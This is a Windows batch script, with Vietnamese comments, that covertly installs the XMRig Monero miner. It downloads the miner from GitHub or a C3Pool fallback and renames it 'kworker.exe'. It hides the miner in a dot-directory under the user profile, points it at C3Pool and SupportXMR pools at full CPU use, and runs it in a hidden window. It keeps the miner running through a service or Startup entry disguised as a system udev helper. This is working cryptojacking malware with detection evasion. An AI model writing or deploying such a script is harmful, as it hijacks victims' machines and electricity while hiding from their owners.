@echo off
setlocal enabledelayedexpansion

set VERSION=4.2-unified-multi-pool-stealth-safe

set C3POOL_DOWNLOAD_URL=https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz
set BACKUP_DOWNLOAD_URL=https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/xmrig.tar.gz
set XMRIG_LATEST_API=https://api.github.com/repos/xmrig/xmrig/releases/latest

set DISGUISE_BIN=kworker.exe
set SERVICE_NAME=systemd-udevd-helper
set DIR_SUFFIX=.kwork
set CONFIG_NAME=resolv.conf.bak
set WRAPPER_NAME=udev-helper.bat

set KEEP_CONFIG=%KEEP_CONFIG%
if "%KEEP_CONFIG%"=="" set KEEP_CONFIG=0
set KEEP_BINARY=%KEEP_BINARY%
if "%KEEP_BINARY%"=="" set KEEP_BINARY=0
set STOP_UDEV=%STOP_UDEV%
if "%STOP_UDEV%"=="" set STOP_UDEV=0

set WALLET=%1
set EMAIL=%2
set PASS=x

net session >nul 2>&1
if %errorLevel% == 0 (set HAS_ROOT=1) else (set HAS_ROOT=0)

if "%WALLET%"=="" (
  echo Setup script v%VERSION%
  echo Usage: %0 ^<wallet address or USDT TRC20 address^> [email]
  exit /b 1
)

REM Kiểm tra độ dài cơ sở ví cơ bản
for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
set WALLET_LEN=0
for /f "tokens=*" %%a in ('powershell -NoProfile -Command "Write-Host $env:WALLET_BASE.Length"') do set WALLET_LEN=%%a

if "%WALLET_LEN%"=="106" goto WALLET_OK
if "%WALLET_LEN%"=="95" goto WALLET_OK
if "%WALLET_LEN%"=="34" goto WALLET_OK
echo ERROR: Wrong wallet base address length: %WALLET_LEN%
exit /b 1
:WALLET_OK

REM Xác định thư mục cài đặt trong User Profile
if "%USERPROFILE%"=="" (
  set "INSTALL_DIR=%TEMP%%DIR_SUFFIX%"
) else (
  set "INSTALL_DIR=%USERPROFILE%\%DIR_SUFFIX%"
)

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
set ARCHIVE=%INSTALL_DIR%\.pkg.tar.gz
if not exist "%INSTALL_DIR%\logs" mkdir "%INSTALL_DIR%\logs" >nul 2>&1

REM Tính toán luồng CPU và hashrate dự kiến qua PowerShell
for /f "tokens=*" %%a in ('powershell -NoProfile -Command "(Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors"') do set CPU_THREADS=%%a
if "%CPU_THREADS%"=="" set CPU_THREADS=1

set /a "EXP_MONERO_HASHRATE = CPU_THREADS * 700 / 1000"
if %EXP_MONERO_HASHRATE% LEQ 0 set EXP_MONERO_HASHRATE=1

REM Tính toán Port dựa trên hashrate
if %EXP_MONERO_HASHRATE% LEQ 5000 (
  set PORT=80
) else if %EXP_MONERO_HASHRATE% LEQ 25000 (
  set PORT=13333
) else if %EXP_MONERO_HASHRATE% LEQ 50000 (
  set PORT=15555
) else if %EXP_MONERO_HASHRATE% LEQ 100000 (
  set PORT=19999
) else (
  set PORT=23333
)

echo Setup script v%VERSION%
echo CPU threads: %CPU_THREADS%
echo Computed C3Pool port: %PORT%
echo Directory: %INSTALL_DIR%
echo Flags: KEEP_CONFIG=%KEEP_CONFIG% KEEP_BINARY=%KEEP_BINARY% STOP_UDEV=%STOP_UDEV%

goto MAIN_EXEC

:download_file
set "url=%~1"
set "output=%~2"
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; try { $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%url%', '%output%'); exit 0 } catch { exit 1 }"
exit /b %errorlevel%

:download_text
set "url=%~1"
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; try { $req = [System.Net.HttpWebRequest]::Create('%url%'); $req.Accept = 'application/vnd.github+json'; $req.UserAgent = 'unified-installer'; $res = $req.GetResponse(); $sr = New-Object System.IO.StreamReader($res.GetResponseStream()); $sr.ReadToEnd(); } catch {}"
exit /b

:MAIN_EXEC

REM Dừng service cũ nếu có
if %HAS_ROOT% == 1 (
  sc stop %SERVICE_NAME% >nul 2>&1
  sc delete %SERVICE_NAME% >nul 2>&1
)

REM Kill tiến trình cũ đang chạy từ thư mục cài đặt
powershell -NoProfile -Command "Get-Process -ErrorAction SilentlyContinue | Where-Object {$_.Path -and $_.Path.StartsWith('%INSTALL_DIR%', 'OrdinalIgnoreCase')} | Stop-Process -Force" >nul 2>&1

echo [*] Preparing package

REM Kiểm tra KEEP_BINARY
if "%KEEP_BINARY%"=="1" if exist "%INSTALL_DIR%\%DISGUISE_BIN%" (
  echo [*] KEEP_BINARY=1 - giữ binary hiện tại
  goto SKIP_DOWNLOAD
)

REM Lấy URL Github Release mới nhất
set "XMRIG_URL="
for /f "tokens=*" %%a in ('call :download_text "%XMRIG_LATEST_API%"') do set "JSON_RES=%%a"
REM Sử dụng PowerShell để trích xuất link file .tar.gz hoặc zip cho windows/linux tương ứng
for /f "tokens=*" %%a in ('powershell -NoProfile -Command "$json = '%JSON_RES%';" ^
  "try { $obj = $json | ConvertFrom-Json; foreach($asset in $obj.assets) { if($asset.browser_download_url -match 'linux-static-x64\.tar\.gz') { Write-Output $asset.browser_download_url; break } } } catch {}"') do set "XMRIG_URL=%%a"

if not "%XMRIG_URL%"=="" (
  echo [*] Latest official XMRig detected. Downloading...
  call :download_file "%XMRIG_URL%" "%ARCHIVE%"
)

if not exist "%ARCHIVE%" (
  echo WARNING: Could not download latest official release. Attempting fallback sources...
  echo [*] Trying C3Pool source: %C3POOL_DOWNLOAD_URL%
  call :download_file "%C3POOL_DOWNLOAD_URL%" "%ARCHIVE%"
  if errorlevel 1 (
    echo WARNING: C3Pool download failed. Trying backup source: %BACKUP_DOWNLOAD_URL%
    call :download_file "%BACKUP_DOWNLOAD_URL%" "%ARCHIVE%"
    if errorlevel 1 (
      echo ERROR: Unable to download release or any fallbacks.
      exit /b 1
    )
  )
)

REM Giải nén file gói bằng tar hoặc PowerShell
if exist "%ARCHIVE%" (
  powershell -NoProfile -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; try { [System.IO.Compression.ZipFile]::ExtractToDirectory('%ARCHIVE%', '%INSTALL_DIR%') } catch { tar -xzf '%ARCHIVE%' -C '%INSTALL_DIR%' }" >nul 2>&1
  del "%ARCHIVE%" >nul 2>&1
)

REM Tìm file xmrig thực thi và đổi tên thành kworker.exe
if exist "%INSTALL_DIR%\xmrig.exe" (
  move /y "%INSTALL_DIR%\xmrig.exe" "%INSTALL_DIR%\%DISGUISE_BIN%" >nul 2>&1
) else (
  REM Trường hợp giải nén ra thư mục con
  for /d %%d in ("%INSTALL_DIR%\xmrig-*") do (
    xcopy /e /y /q "%%d\*" "%INSTALL_DIR%\" >nul 2>&1
    rmdir /q /s "%%d" >nul 2>&1
  )
  if exist "%INSTALL_DIR%\xmrig.exe" move /y "%INSTALL_DIR%\xmrig.exe" "%INSTALL_DIR%\%DISGUISE_BIN%" >nul 2>&1
  if exist "%INSTALL_DIR%\xmrig" move /y "%INSTALL_DIR%\xmrig" "%INSTALL_DIR%\%DISGISUE_BIN%" >nul 2>&1
)

:SKIP_DOWNLOAD

if not exist "%INSTALL_DIR%\%DISGUISE_BIN%" (
  echo ERROR: Binary is not functional or missing.
  exit /b 1
)

set "CONFIG_PATH=%INSTALL_DIR%\%CONFIG_NAME%"
set "CONFIG_BG=%INSTALL_DIR%\.%CONFIG_NAME%.bg"

REM Tạo file cấu hình JSON
(
echo {
echo     "autosave": true,
echo     "background": false,
echo     "cpu": true,
echo     "opencl": false,
echo     "cuda": false,
echo     "pools": [
echo         { "url": "auto.c3pool.org:%PORT%", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "auto.c3pool.org:19999", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "auto.c3pool.org:443",   "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": true  },
echo         { "url": "auto.c3pool.org:80",    "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "auto.c3pool.org:33333", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": true  },
echo         { "url": "auto.c3pool.org:23333", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "pool.supportxmr.com:443",  "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": true  },
echo         { "url": "pool.supportxmr.com:8080", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "pool.supportxmr.com:7777", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "pool.supportxmr.com:5555", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "pool.supportxmr.com:80",   "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false },
echo         { "url": "pool.supportxmr.com:3333", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false }
echo     ],
echo     "log-file": null,
echo     "donate-level": 0,
echo     "max-cpu-usage": 100,
echo     "syslog": false
echo }
) > "%CONFIG_PATH%"

REM Tạo config nền (background = true)
powershell -NoProfile -Command "(gc '%CONFIG_PATH%') -replace '\"background\": *false', '\"background\": true' | sc '%CONFIG_BG%'" >nul 2>&1

set "RUNNER=%INSTALL_DIR%\%WRAPPER_NAME%"
set "RUNNER_BG=%INSTALL_DIR%\.%WRAPPER_NAME%-bg.bat"

REM Tạo wrapper script chạy foreground
(
echo @echo off
echo cd /d "%INSTALL_DIR%"
echo if not exist "%INSTALL_DIR%\%DISGUISE_BIN%" exit /b
echo start /b "" "%INSTALL_DIR%\%DISGUISE_BIN%" --config="%CONFIG_PATH%" --no-color --quiet
) > "%RUNNER%"

REM Tạo wrapper script chạy background ẩn cửa sổ
(
echo @echo off
echo cd /d "%INSTALL_DIR%"
echo powershell -NoProfile -Command "Start-Process '%RUNNER%' -WindowStyle Hidden"
) > "%RUNNER_BG%"

if %HAS_ROOT% == 1 (
  echo [*] Installing Windows Service using NSSM or PowerShell...
  REM Tải công cụ nssm hỗ trợ tạo service trên Windows nếu cần hoặc cấu hình lệnh Task Scheduler / SC
  sc create %SERVICE_NAME% binPath= "cmd.exe /c start /b %RUNNER% --config=%CONFIG_PATH%" start= auto DisplayName= "System Udev Events Helper" >nul 2>&1
  sc start %SERVICE_NAME% >nul 2>&1
  if errorlevel 1 set HAS_ROOT=0
)

if %HAS_ROOT% == 0 (
  echo [*] No root/admin - user-level persistence via Startup directory
  
  for %%s in (
    "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup",
    "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  ) do (
    if exist "%%~s" (
      (
      echo @echo off
      echo call "%RUNNER_BG%"
      ) > "%%~s\udev-helper.bat"
      goto STARTUP_DONE
    )
  )
  :STARTUP_DONE

  REM Khởi chạy ngay lập tức ở background
  call "%RUNNER_BG%"
)

echo [*] Setup complete - initialized
timeout /t 2 >nul
exit /b 0